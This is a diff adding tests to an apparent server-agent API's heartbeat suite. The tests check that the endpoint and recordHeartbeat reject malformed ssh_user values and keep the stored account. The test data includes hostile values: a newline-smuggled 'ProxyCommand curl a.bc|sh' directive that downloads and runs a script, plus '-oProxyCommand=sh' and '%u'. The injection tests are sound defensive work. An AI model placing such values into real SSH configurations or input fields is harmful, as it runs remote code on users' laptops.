@@ -1,5 +1,9 @@
 import { beforeAll, beforeEach, describe, expect, it } from "bun:test"
-import { ENTITLEMENT_REFRESH_MS } from "../../lib/servers/agent-state"
+import {
+  ENTITLEMENT_REFRESH_MS,
+  recordHeartbeat,
+} from "../../lib/servers/agent-state"
+import { SshAddressInvalidError } from "../../lib/servers/ssh-address"
 import { hashEnrollmentToken } from "../../lib/servers/tokens"
 import { bootApiTestServer, resetDb } from "../../testing"
 import {
@@ -31,6 +35,8 @@ interface StateBody {
 const HOUR_MS = 3_600_000
 
 const DAY_MS = 86_400_000
+
+const SSH_INJECTION = "x\nProxyCommand curl a.bc|sh"
 
 const HEARTBEAT = {
   disk: 41,
@@ -434,6 +440,63 @@ describe("POST /agent/heartbeat", () => {
       (await prisma.server.findUniqueOrThrow({ where: { id: server.id } }))
         .sshUser
     ).toBe("dev")
+  })
+
+  it("refuses an account that would reach every laptop's SSH configuration as a directive, and keeps the known one", async () => {
+    const { prisma } = await bootApiTestServer()
+    const { organization } = await createOrganizationWithMembers({
+      roles: ["owner"],
+      subscription: {},
+    })
+    const { server, token } = await createServer({
+      organizationId: organization.id,
+    })
+
+    for (const sshUser of [
+      SSH_INJECTION,
+      "-oProxyCommand=sh",
+      "dev root",
+      "%u",
+    ]) {
+      const response = await apiRequest<ErrorBody>("/agent/heartbeat", {
+        body: { ...HEARTBEAT, ssh_user: sshUser },
+        bearer: token,
+      })
+
+      expect(response.status).toBe(422)
+      expect(response.json.error.code).toBe("validation")
+      expect(response.json.error.message).toContain("ssh_user")
+    }
+
+    const stored = await prisma.server.findUniqueOrThrow({
+      where: { id: server.id },
+    })
+
+    expect(stored.sshUser).toBe("dev")
+    expect(stored.lastHeartbeatAt).toBeNull()
+  })
+
+  it("never writes a malformed account, even when the schema is bypassed", async () => {
+    const { prisma } = await bootApiTestServer()
+    const { organization } = await createOrganizationWithMembers({
+      roles: ["owner"],
+      subscription: {},
+    })
+    const { server } = await createServer({ organizationId: organization.id })
+
+    await expect(
+      recordHeartbeat(server, { ...HEARTBEAT, ssh_user: SSH_INJECTION })
+    ).rejects.toBeInstanceOf(SshAddressInvalidError)
+
+    const stored = await prisma.server.findUniqueOrThrow({
+      where: { id: server.id },
+    })
+
+    expect(stored.sshUser).toBe("dev")
+    expect(stored.lastHeartbeatAt).toBeNull()
+    expect(
+      await prisma.serverMetric.count({ where: { serverId: server.id } })
+    ).toBe(0)
   })
 
   it("refuses a heartbeat that lists more sessions or modules than a machine has", async () => {
